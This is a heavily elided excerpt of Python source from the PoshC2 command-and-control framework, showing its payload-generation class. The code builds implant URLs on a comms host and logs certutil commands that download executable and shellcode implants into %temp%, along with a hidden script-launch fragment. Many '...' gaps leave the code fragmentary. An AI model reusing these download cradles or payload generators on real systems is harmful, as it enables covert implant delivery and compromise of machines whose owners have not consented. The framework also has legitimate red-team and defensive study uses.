...
from poshc2.server.Config import PayloadsDirectory, QuickCommand, PayloadTemplatesDirectory, DefaultMigrationProcess, DatabaseType
from poshc2.Colours import Colours
from poshc2.Utils import gen_key, randomuri, formStrMacro, formStr


if DatabaseType.lower() == "postgres":
    from poshc2.server.database.DBPostgres import get_url_by_id, get_default_url_id
else:
    from poshc2.server.database.DBSQLite import get_url_by_id, get_default_url_id
...
class Payloads(object):
    ...
    def __init__(self, KillDate, Key, Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory, URLID = None, ImplantType = "", PowerShellProxyCommand = ""):
        ...
        cs5 = cs4.replace("#REPLACEQUICKCOMMAND#", self.PayloadCommsHost + "/" + QuickCommand + "_py")
...
""" % basefile
        ...
        psuri = self.PayloadCommsHost + "/" + QuickCommand + "_rp"
        ...
        uri = self.PayloadCommsHost + "/" + QuickCommand + "_cs"
        ...
        uri = self.PayloadCommsHost + "/" + QuickCommand + "_rg"
...
ao.run('%s', 0);window.close();
    ...
    def CreateEXE(self, name=""):
        ...
        try:
            uri = self.PayloadCommsHost + "/" + QuickCommand + "_ex64"
            filename = randomuri()
            self.QuickstartLog(Colours.END)
            ...
            uri = self.PayloadCommsHost + "/" + QuickCommand + "_ex86"
            filename = randomuri()
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (uri, filename))
            if os.name == 'nt':
            ...
            uri = self.PayloadCommsHost + "/" + QuickCommand + "s/64/portal"
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
            uri = self.PayloadCommsHost + "/" + QuickCommand + "s/86/portal"
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
            uri = self.PayloadCommsHost + "/" + QuickCommand + "p/64/portal"
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
            uri = self.PayloadCommsHost + "/" + QuickCommand + "p/86/portal"
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
